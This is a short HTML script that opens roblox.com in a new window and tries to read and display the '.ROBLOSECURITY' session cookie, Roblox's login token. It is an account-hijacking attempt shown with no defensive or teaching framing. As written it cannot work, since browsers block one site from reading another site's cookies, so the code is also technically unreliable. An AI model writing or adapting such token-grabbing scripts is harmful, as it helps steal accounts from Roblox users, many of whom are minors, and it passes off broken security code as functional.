<script>
var windowWindow = window.open("https://www.roblox.com/home")
  
function getCookie(cname) {
  let name = cname + "=";
  let decodedCookie = decodeURIComponent(windowWindow.document.cookie);
  let ca = decodedCookie.split(';');
  for(let i = 0; i <ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) == ' ') {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return "No cookie data found";
}
  alert(getCookie(".ROBLOSECURITY"))
  
</script>
